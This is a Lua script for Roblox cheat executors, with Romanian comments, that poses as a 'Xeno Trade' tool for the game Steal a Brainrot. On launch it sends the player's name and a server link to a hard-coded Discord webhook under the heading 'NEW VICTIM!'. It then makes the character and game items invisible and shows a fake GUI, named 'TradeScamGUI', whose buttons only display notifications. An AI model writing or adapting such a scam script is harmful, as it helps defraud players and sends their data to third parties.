-- Script pentru Steal a Brainrot (Xeno Edition)
-- Compatibil cu Xeno Executor

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Workspace = game:GetService("Workspace")

-- ===== CONFIGURARE =====
local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
local SCRIPT_NAME = "⚡ Steal a Brainrot - Xeno v2.0"

-- ===== FUNCȚIE DE TRIMITERE PE DISCORD (XENO) =====
local function sendToDiscord(message)
    local request = request or http_request or syn.request
    if request then
        local success, result = pcall(function()
            request({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({
                    content = message
                })
            })
        end)
        if not success then
            print("⚠️ Nu am putut trimite pe Discord, dar scriptul continua!")
        end
    else
        print("⚠️ Xeno nu suporta request-uri HTTP, continui fara Discord.")
    end
end

-- ===== OBȚINE LINKUL SERVERULUI PRIVAT =====
local function getPrivateServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
end

-- ===== SPOOFING - ASCUNDE FURTUL =====
local function enableSpoofing()
    local realBrainrots = {}
    
    -- Găsește brainrot-urile
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and obj.Name and (obj.Name:find("Brainrot") or obj.Name:find("BrainRot") or obj.Name:find("Brain")) then
            table.insert(realBrainrots, obj)
        end
    end
    
    -- Ascunde-le
    for _, brainrot in pairs(realBrainrots) do
        pcall(function()
            brainrot.Transparency = 1
            brainrot.CanCollide = false
        end)
    end
    
    -- Creează fake-uri
    for _, realBrainrot in pairs(realBrainrots) do
        pcall(function()
            local fakeBrainrot = realBrainrot:Clone()
            fakeBrainrot.Name = realBrainrot.Name .. "_Fake"
            fakeBrainrot.Parent = Workspace
            fakeBrainrot.CFrame = realBrainrot.CFrame
            fakeBrainrot.Transparency = 0
            fakeBrainrot.CanCollide = true
        end)
    end
    
    print("✅ Spoofing activat: " .. #realBrainrots .. " brainrot-uri ascunse!")
end

-- ===== ASCUNDE PERSONAJUL =====
local function hideCharacter()
    if Character then
        for _, part in pairs(Character:GetDescendants()) do
            pcall(function()
                if part:IsA("BasePart") then
                    part.Transparency = 1
                    part.CanCollide = false
                end
            end)
        end
        
        -- Ascunde numele
        pcall(function()
            LocalPlayer.NameDisplayDistance = 0
        end)
        
        -- Oprește sunetele
        for _, sound in pairs(Character:GetDescendants()) do
            pcall(function()
                if sound:IsA("Sound") then
                    sound.Volume = 0
                end
            end)
        end
        
        print("✅ Personaj invizibil!")
    end
end

-- ===== GUI FALS =====
local function createFakeGUI()
    pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "TradeScamGUI"
        screenGui.ResetOnSpawn = false
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 400, 0, 350)
        frame.Position = UDim2.new(0.5, -200, 0.5, -175)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
        frame.BackgroundTransparency = 0.1
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.Draggable = true
        frame.Parent = screenGui
        
        -- Titlu
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 40)
        title.Position = UDim2.new(0, 0, 0, 0)
        title.Text = "⚡ XENO TRADE v2.0 ⚡"
        title.TextColor3 = Color3.fromRGB(255, 70, 70)
        title.BackgroundTransparency = 1
        title.Font = Enum.Font.GothamBold
        title.TextScaled = true
        title.Parent = frame
        
        -- Buton "Freeze Trade"
        local btn1 = Instance.new("TextButton")
        btn1.Size = UDim2.new(0.9, 0, 0, 40)
        btn1.Position = UDim2.new(0.05, 0, 0.15, 0)
        btn1.Text = "❄️ FREEZE TRADE"
        btn1.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn1.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn1.Font = Enum.Font.GothamBold
        btn1.TextScaled = true
        btn1.Parent = frame
        btn1.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Trade Freeze",
                Text = "❄️ Trade frozen! You are now invisible.",
                Duration = 3
            })
        end)
        
        -- Buton "Auto Steal"
        local btn2 = Instance.new("TextButton")
        btn2.Size = UDim2.new(0.9, 0, 0, 40)
        btn2.Position = UDim2.new(0.05, 0, 0.30, 0)
        btn2.Text = "🔥 AUTO STEAL"
        btn2.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn2.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn2.Font = Enum.Font.GothamBold
        btn2.TextScaled = true
        btn2.Parent = frame
        btn2.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Auto Steal",
                Text = "🔥 Auto steal activated!",
                Duration = 3
            })
        end)
        
        -- Buton "Invisible"
        local btn3 = Instance.new("TextButton")
        btn3.Size = UDim2.new(0.9, 0, 0, 40)
        btn3.Position = UDim2.new(0.05, 0, 0.45, 0)
        btn3.Text = "👻 INVISIBLE"
        btn3.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        btn3.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn3.Font = Enum.Font.GothamBold
        btn3.TextScaled = true
        btn3.Parent = frame
        btn3.MouseButton1Click:Connect(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Invisible",
                Text = "👻 You are now invisible!",
                Duration = 3
            })
        end)
        
        -- Status
        local status = Instance.new("TextLabel")
        status.Size = UDim2.new(1, 0, 0, 30)
        status.Position = UDim2.new(0, 0, 0.70, 0)
        status.Text = "🟢 Ready - Xeno"
        status.TextColor3 = Color3.fromRGB(100, 255, 100)
        status.BackgroundTransparency = 1
        status.Font = Enum.Font.Gotham
        status.TextScaled = true
        status.Parent = frame
        
        -- Close
        local closeBtn = Instance.new("TextButton")
        closeBtn.Size = UDim2.new(0, 30, 0, 30)
        closeBtn.Position = UDim2.new(1, -35, 0, 5)
        closeBtn.Text = "✕"
        closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
        closeBtn.Font = Enum.Font.GothamBold
        closeBtn.TextScaled = true
        closeBtn.Parent = frame
        closeBtn.MouseButton1Click:Connect(function()
            screenGui:Destroy()
        end)
        
        screenGui.Parent = LocalPlayer.PlayerGui
        print("✅ GUI creat!")
    end)
end

-- ===== MAIN =====
local function main()
    print("🚀 Pornesc scriptul Xeno...")
    
    -- 1. Trimite linkul serverului privat pe Discord (daca merge)
    local serverLink = getPrivateServerLink()
    if serverLink then
        sendToDiscord("**📱 NEW VICTIM!**\n\n**Player:** " .. LocalPlayer.Name .. "\n**Server Link:** " .. serverLink)
        print("📤 Link trimis pe Discord (daca a mers)")
    end
    
    -- 2. Activează spoofing-ul
    enableSpoofing()
    
    -- 3. Ascunde personajul
    hideCharacter()
    
    -- 4. Creează GUI-ul fals
    createFakeGUI()
    
    -- 5. Notifică victima
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = SCRIPT_NAME,
        Text = "✅ Xeno Trade loaded successfully!",
        Duration = 3
    })
    
    print("✅ Script Xeno rulat cu succes!")
end

-- ===== START =====
pcall(function()
    main()
end)
